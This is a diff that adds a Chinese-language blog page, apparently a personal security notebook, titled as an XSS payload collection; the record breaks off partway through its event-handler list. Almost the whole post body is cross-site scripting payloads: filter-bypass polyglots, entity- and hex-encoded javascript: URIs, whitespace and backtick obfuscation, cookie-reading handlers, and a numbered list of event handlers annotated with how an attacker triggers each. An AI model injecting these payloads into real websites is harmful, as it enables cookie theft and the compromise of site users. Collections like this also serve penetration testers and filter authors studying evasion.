@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="学习笔记,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="-使用URL编码器对整个代码进行编码12345&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--&amp;gt;&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;&apos;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;">
+<meta name="keywords" content="学习笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss payload收集">
+<meta property="og:url" content="elssm.github.io/2018/06/27/xss-payload收集/index.html">
+<meta property="og:site_name" content="ELSSM">
+<meta property="og:description" content="-使用URL编码器对整个代码进行编码12345&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--&amp;gt;&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;&apos;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-07-03T13:49:32.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss payload收集">
+<meta name="twitter:description" content="-使用URL编码器对整个代码进行编码12345&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--&amp;gt;&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;&apos;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="elssm.github.io/2018/06/27/xss-payload收集/">
+
+
+
+
+
+  <title>xss payload收集 | ELSSM</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ELSSM</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">安全小白</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="elssm.github.io/2018/06/27/xss-payload收集/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Caoyifan">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ELSSM">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xss payload收集</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-27T21:42:21+08:00">
+                2018-06-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="使用URL编码器对整个代码进行编码"><a href="#使用URL编码器对整个代码进行编码" class="headerlink" title="-使用URL编码器对整个代码进行编码"></a>-使用URL编码器对整个代码进行编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';alert(String.fromCharCode(88,83,83))//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">";alert(String.fromCharCode(88,83,83))//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--&gt;&lt;/SCRIPT&gt;"&gt;'</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>))</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="较短的xss定位器"><a href="#较短的xss定位器" class="headerlink" title="-较短的xss定位器"></a>-较短的xss定位器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";!--"</span>&lt;XSS&gt;=&amp;&#123;()&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用多语言进行过滤绕过"><a href="#利用多语言进行过滤绕过" class="headerlink" title="-利用多语言进行过滤绕过"></a>-利用多语言进行过滤绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;"&gt;&lt;/plaintext\&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script&gt;alert(document.cookie)&lt;/script&gt;"&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;img/id="confirm&amp;lpar;1)"/alt="/"src="/"onerror=eval(id)&gt;'</span><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="HTML实体"><a href="#HTML实体" class="headerlink" title="-HTML实体"></a>-HTML实体</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="重音符混淆"><a href="#重音符混淆" class="headerlink" title="-重音符混淆"></a>-重音符混淆</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=<span class="string">`javascript:alert("xss")`</span>&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="A标签"><a href="#A标签" class="headerlink" title="-A标签"></a>-A标签</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover=<span class="string">"alert(document.cookie)"</span>&gt;xss link&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;a onmouseover=alert(document.cookie)&gt;xss link&lt;/</span>a&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="IMG标签"><a href="#IMG标签" class="headerlink" title="-IMG标签"></a>-IMG标签</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG <span class="string">""</span><span class="string">"&gt;&lt;SCRIPT&gt;alert("</span>xss<span class="string">")&lt;/SCRIPT&gt;"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=<span class="string">"&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#000011</span></span><br><span class="line"><span class="string">5&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000</span></span><br><span class="line"><span class="string">097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#00</span></span><br><span class="line"><span class="string">00088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"</span>&gt; </span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#11</span><br><span class="line">6;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40; </span><br><span class="line">&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt; </span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#00000</span><br><span class="line">99&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp; </span><br><span class="line">#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088</span><br><span class="line">&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt; </span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74</span><br><span class="line">&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27</span><br><span class="line">&amp;#x29&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="内嵌TAB"><a href="#内嵌TAB" class="headerlink" title="-内嵌TAB"></a>-内嵌TAB</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=<span class="string">"jav ascript:alert('XSS');"</span>&gt; </span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=<span class="string">"jav&amp;#x09;ascript:alert('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="内嵌换行分割"><a href="#内嵌换行分割" class="headerlink" title="-内嵌换行分割"></a>-内嵌换行分割</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=<span class="string">"jav&amp;#x0A;ascript:alert('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="内嵌回车"><a href="#内嵌回车" class="headerlink" title="-内嵌回车"></a>-内嵌回车</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=<span class="string">"jav&amp;#x0D;ascript:alert('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="JavaScript双重转义"><a href="#JavaScript双重转义" class="headerlink" title="-JavaScript双重转义"></a>-JavaScript双重转义</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">";alert('XSS');//</span></span><br></pre></td></tr></table></figure>
+<h3 id="ECMAScript-6"><a href="#ECMAScript-6" class="headerlink" title="-ECMAScript 6"></a>-ECMAScript 6</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>.constructor<span class="string">`alert\x28document.domain\29`</span></span><br></pre></td></tr></table></figure>
+<h3 id="事件处理程序"><a href="#事件处理程序" class="headerlink" title="-事件处理程序"></a>-事件处理程序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件) </span><br><span class="line"><span class="number">2.</span> onAbort() (当用户中止加载图片时) </span><br><span class="line"><span class="number">3.</span> onActivate() (当对象激活时) </span><br><span class="line"><span class="number">4.</span> onAfterPrint() (用户打印或进行打印预览后触发) </span><br><span class="line"><span class="number">5.</span> onAfterUpdate() (从数据源对象更新数据后由数据对象触发) </span><br><span class="line"><span class="number">6.</span> onBeforeActivate() (在对象设置为激活元素前触发) </span><br><span class="line"><span class="number">7.</span> onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过</span><br><span class="line">执行execCommand(<span class="string">"Copy"</span>)函数触发) </span><br><span class="line"><span class="number">8.</span> onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码) </span><br><span class="line"><span class="number">9.</span> onBeforeDeactivate() (在当前对象的激活元素变化前触发) </span><br><span class="line"><span class="number">10.</span> onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的</span><br><span class="line">对象被选中时触发) </span><br><span class="line"><span class="number">11.</span> onBeforePaste() (在用户被诱导进行粘贴前或使用 execCommand(<span class="string">"Paste"</span>)函数触</span><br><span class="line">发) </span><br><span class="line"><span class="number">12.</span> onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用 print()或 execComma</span><br><span class="line">nd(<span class="string">"Print"</span>)函数). </span><br><span class="line"><span class="number">13.</span> onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能</span><br><span class="line">关闭当前窗口) </span><br><span class="line"><span class="number">14.</span> onBeforeUpdate() (从数据源对象更新数据前由数据对象触发) </span><br><span class="line"><span class="number">15.</span> onBegin() (当元素周期开始时由onbegin 事件立即触发) </span><br><span class="line"><span class="number">16.</span> onBlur() (另一个窗口弹出当前窗口失去焦点时触发) </span><br><span class="line"><span class="number">17.</span> onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内</span><br><span class="line">容到达窗口一边时触发) </span><br><span class="line"><span class="number">18.</span> onCellChange() (当数据提供者的数据变化时触发) </span><br><span class="line"><span class="number">19.</span> onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发) </span><br><span class="line"><span class="number">20.</span> onClick() (表单中点击触发) </span><br><span class="line"><span class="number">21.</span> onContextMenu() (用户需要在攻击区域点击右键) </span><br><span class="line"><span class="number">22.</span> onControlSelect() (当用户在一个对象上创建控件选中区时触发) </span><br><span class="line"><span class="number">23.</span> onCopy() (用户需要复制一些东西或使用execCommand(<span class="string">"Copy"</span>)命令时触发) </span><br><span class="line"><span class="number">24.</span> onCut() (用户需要剪切一些东西或使用execCommand(<span class="string">"Cut"</span>)命令时触发) </span><br><span class="line"><span class="number">25.</span> onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能) </span><br><span class="line"><span class="number">26.</span> onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发) </span><br><span class="line"><span class="number">27.</span> onDataSetComplete() (数据源对象中所有数据可用时触发) </span><br><span class="line"><span class="number">28.</span> onDblClick() (用户双击一个表单元素或链接) </span><br><span class="line"><span class="number">29.</span> onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发) </span><br><span class="line"><span class="number">30.</span> onDrag() (在元素正在拖动时触发) </span><br><span class="line"><span class="number">31.</span> onDragEnd() (当用户完成元素的拖动时触发) </span><br><span class="line"><span class="number">32.</span> onDragLeave() (用户在拖动元素离开放置目标时触发) </span><br><span class="line"><span class="number">33.</span> onDragEnter() (用户将对象拖拽到合法拖曳目标) </span><br><span class="line"><span class="number">34.</span> onDragOver() (用户将对象拖拽划过合法拖曳目标) </span><br><span class="line"><span class="number">35.</span> onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口) </span><br><span class="line"><span class="number">36.</span> onDragStart() (当用户开始拖动元素时触发) </span><br><span class="line"><span class="number">37.</span> onDrop() (当拖动元素放置在目标区域时触发) </span><br><span class="line"><span class="number">38.</span> onEnded() (在视频/音频（audio/video）播放结束时触发) </span><br><span class="line"><span class="number">39.</span> onError() (在加载文档或图像时发生错误) </span><br><span class="line"><span class="number">40.</span> onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发) </span><br><span class="line"><span class="number">41.</span> onFilterChange() (当滤镜完成状态变更时触发) </span><br><span class="line"><span class="number">42.</span> onFinish() (当marquee完成滚动时攻击者可以执行攻击) </span><br><span class="line"><span class="number">43.</span> onFocus() (当窗口获得焦点时攻击者可以执行攻击代码) </span><br><span class="line"><span class="number">44.</span> onFocusIn() (当元素将要被设置为焦点之前触发) </span><br><span class="line"><span class="number">45.</span> onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码) </span><br><span class="line"><span class="number">46.</span> onHashChange() (当锚部分发生变化时触发攻击代码) </span><br><span class="line"><span class="number">47.</span> onHelp() (攻击者可以在用户在当前窗体激活时按下F1 触发攻击代码) </span><br><span class="line"><span class="number">48.</span> onInput() (在 &lt;input&gt; 或 &lt;textarea&gt; 元素的值发生改变时触发) </span><br><span class="line"><span class="number">49.</span> onKeyDown() (用户按下一个键的时候触发) </span><br><span class="line"><span class="number">50.</span> onKeyPress() (在键盘按键被按下并释放一个键时触发) </span><br><span class="line"><span class="number">51.</span> onKeyUp() (用户释放一个键时触发) </span><br><span class="line"><span class="number">52.</span> onLayoutComplete() (用户进行完打印或打印预览时触发) </span><br><span class="line"><span class="number">53.</span> onLoad() (攻击者在窗口加载后触发攻击代码) </span><br><span class="line"><span class="number">54.</span> onLoseCapture() (可以由releaseCapture()方法触发) </span><br><span class="line"><span class="number">55.</span> onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发) </span><br><span class="line"><span class="number">56.</span> onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发</span><br><span class="line">事件) </span><br><span class="line"><span class="number">57.</span> onMessage() (当页面收到一个信息时触发事件) </span><br><span class="line"><span class="number">58.</span> onMouseDown() (攻击者需要让用户点击一个图片触发事件) </span><br><span class="line"><span class="number">59.</span> onMouseEnter() (光标移动到一个对象或区域时触发) </span><br><span class="line"><span class="number">60.</span> onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事</span><br><span class="line">件) </span><br><span class="line"><span class="number">61.</span> onMouseMove() (攻击者需要让用户将光标移到一个图片或表格) </span><br><span class="line"><span class="number">62.</span> onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件) </span><br><span class="line"><span class="number">63.</span> onMouseOver() (光标移动到一个对象或区域) </span><br><span class="line"><span class="number">64.</span> onMouseUp() (攻击者需要让用户点击一个图片) </span><br><span class="line"><span class="number">65.</span> onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮) </span><br><span class="line"><span class="number">66.</span> onMove() (用户或攻击者移动页面时触发) </span><br><span class="line"><span class="number">67.</span> onMoveEnd() (用户或攻击者移动页面结束时触发) </span><br><span class="line"><span class="number">68.</span> onMoveStart() (用户或攻击者开始移动页面时触发) </span><br><span class="line"><span class="number">69.</span> onOffline() (当浏览器从在线模式切换到离线模式时触发) </span><br><span class="line"><span class="number">70.</span> onOnline() (当浏览器从离线模式切换到在线模式时触发) </span><br><span class="line"><span class="number">71.</span> onOutOfSync() (当元素与当前时间线失去同步时触发) </span><br><span class="line"><span class="number">72.</span> onPaste() (用户进行粘贴时或攻击者可以使用execCommand(<span class="string">"Paste"</span>)函数时触发) </span><br><span class="line"><span class="number">73.</span> onPause() (在视频或音频暂停时触发) </span><br><span class="line"><span class="number">74.</span> onPopState() (在窗口的浏览历史（history 对象）发生改变时触发) </span><br><span class="line"><span class="number">75.</span> onProgress() (攻击者可以在一个FLASH加载时触发事件) </span><br><span class="line"><span class="number">76.</span> onPropertyChange() (用户或攻击者需要改变元素属性时触发) </span><br><span class="line"><span class="number">77.</span> onReadyStateChange() (每次 readyState 属性变化时被自动调用) </span><br><span class="line"><span class="number">78.</span> onRedo() (用户返回上一页面时触发) </span><br><span class="line"><span class="number">79.</span> onRepeat() (事件在播放完重复播放时触发) </span><br><span class="line"><span class="number">80.</span> onReset() (用户或攻击者重置表单时触发) </span><br><span class="line"><span class="number">81.</span> onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发: <span class="xml"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>self.resizeTo(500,400);<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span>) </span><br><span class="line"><span class="number">82.</span> onResizeEnd() (用户完成改变窗体大小时触发) </span><br><span class="line"><span class="number">83.</span> onResizeStart() (用户开始改变窗体大小时触发) </span><br><span class="line"><span class="number">84.</span> onResume() (当元素继续播放时触发) </span><br><span class="line"><span class="number">85.</span> onReverse() (当元素回放时触发) </span><br><span class="line"><span class="number">86.</span> onRowsEnter() (用户或攻击者需要改变数据源中的一行) </span><br><span class="line"><span class="number">87.</span> onRowExit() (用户或攻击者改变数据源中的一行后退出时触发) </span><br><span class="line"><span class="number">88.</span> onRowDelete() (用户或攻击者需要删除数据源中的一行) </span><br><span class="line"><span class="number">89.</span> onRowInserted() (user or attacker would need to insert a row <span class="keyword">in</span> a data source) </span><br><span class="line"><span class="number">90.</span> onScroll() (用户需要滚动或攻击者使用scrollBy()函数) </span><br><span class="line"><span class="number">91.</span> onSeek() (当用户在元素上执行查找操作时触发) </span><br><span class="line"><span class="number">92.</span> onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: <span class="built_in">window</span>.document.execCommand(<span class="string">"SelectAll"</span>);) </span><br><span class="line"><span class="number">93.</span> onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: <span class="built_in">window</span>.document.execCommand(<span class="string">"SelectAll"</span>);) </span><br><span class="line"><span class="number">94.</span> onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: <span class="built_in">window</span>.document.execCommand(<span class="string">"SelectAll"</span>);) </span><br><span class="line"><span class="number">95.</span> onStart() (在marquee 对象开始循环时触发) </span><br><span class="line"><span class="number">96.</span> onStop() (当用户按下停止按钮或离开页面时触发) </span><br><span class="line"><span class="number">97.</span> onStorage() (当Web Storage更新时触发) </span><br><span class="line"><span class="number">98.</span> onSyncRestored() (当元素与它的时间线恢复同步时触发) </span><br><span class="line"><span class="number">99.</span> onSubmit() (需要用户或攻击者提交表单) </span><br><span class="line"><span class="number">100.</span>onTimeError() (用户或攻击者设置时间属性出现错误时触发) </span><br><span class="line"><span class="number">101.</span>onTrackChange() (用户或攻击者改变播放列表内歌曲时触发) </span><br><span class="line"><span class="number">102.</span>onUndo() (用户返回上一浏览记录页面时触发) </span><br><span class="line"><span class="number">103.</span>onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发) </span><br><span class="line"><span class="number">104.</span>onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个 HTML+TIME（基于时间</span><br><span class="line">交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本) </span><br><span class="line"><span 